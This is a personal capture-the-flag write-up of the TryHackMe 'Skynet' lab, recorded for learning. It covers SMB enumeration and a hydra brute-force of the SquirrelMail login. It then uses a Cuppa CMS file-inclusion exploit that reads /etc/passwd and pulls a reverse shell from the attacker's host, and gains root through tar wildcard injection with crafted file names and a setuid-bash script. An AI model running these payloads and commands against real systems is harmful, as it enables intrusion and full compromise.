# Skynet [TryHackMe]

<sub>_This is a raw write-up. I write these to document important things for myself to use later if I need it. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.177.77
```

Let's perform an `nmap` scan and check for open ports:

```
nmap -A -Pn $targ3t -oN nmap.scan
```

We have six open ports `445`, `110`, `80`, `143`, `139`, `22`. 

Let's start enumerating the first one:

```
nmap --script=smb* -p 445 $targ3t -oN nmap.445.scan
```

It appears that Anonymous login to this share is permitted.

```
smbclient '//$targ3t/Anonymous'
```

Let's see what files we have:

```
smb: \> ls
```

There's an `attention.txt` file and a `logs` directory.

```
get attention.txt
```

It says the following:

```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

In the `logs` directory we have three files:
- `log1.txt`
- `log2.txt`
- `log3.txt`

We will get them all and see what they have:

`log1.txt`:
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
...
```

Appears to be a wordlist. The other two are empty. Let's check other ports for vulnerabilities for now. From our initial `nmap.scan` we can see that there is an http port `80`, let's see what's on there:

```
firefox $targ3t
```

Appears to be a search engine. Let's put it through `gobuster`:

```
gobuster dir -u http://$targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.scan
```

There's a path `/squirrellmail` for email login interface and there's a user named `milesdyson` we know from our `nmap.445.scan`. Let's try to brute force it with hydra:

```
hydra -l milesdyson -P log1.txt $targ3t http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect" -vV
```

This reveals the password to be `cyborg007haloterminator`. The very first email reveals the samba password for this user:

```
smbclient '//10.10.177.77/milesdyson' -U milesdyson
```

There is a `notes` directory and inside there is `important.txt` file which reveals a path on this website:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

This path has a static page on it. Let's put it through `feroxbuster`:

```
feroxbuster -u http://$targ3t/45kra24zxs28v3yd -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

There's a path named `/administrator`. It's supposed to be a Cuppa CMS login interface.

```
searchsploit Cuppa
```

There is one:

```
cp /usr/share/exploitdb/exploits/php/webapps/25971.txt .
```

This details steps for remote file inclusion. 

Let's use one of the examples inside the exploit to test:

```
http://10.10.177.77/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

It prints the `/etc/passwd` file from the server like a charm. Let's get the user flag:

```
http://10.10.177.77/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
```

We can't get root flag the same way, probably for the lack of privileges, but we can have it include reverse shell on the server. First let's start a server with `reverse.php` already on it:

```
python -m http.server 8080
```

And start a netcat listener:

```
nc -lvnp 9876
```

And request the following url:

```
http://10.10.177.77/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.100.243:8080/reverse.php
```

We got the shell! 

```
whoami
```

Apparently we are `www-data`. Let's try to become root:

```
cat /etc/crontab
```

There's a root owned file `/home/milesdyson/backups/backup.sh` running on crontab.

```
cat /home/milesdyson/backups/backup.sh
```

It is using `tar cf /home/milesdyson/backups/backup.tgz *` to compress `var/www/html`. We can exploit this with that wildcard. Let's go to the directory where the script is going and do the following:

```
cd /var/www/html
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
```

And then create the `privesc.sh` script in the same directory:

```
printf "#!/bin/bash\nchmod +s /bin/bash" > privesc.sh
```

After a minute, let's execute:

```
/bin/bash -p
```

We have a root shell.

```
cat /root/root.txt
```

And a root flag!
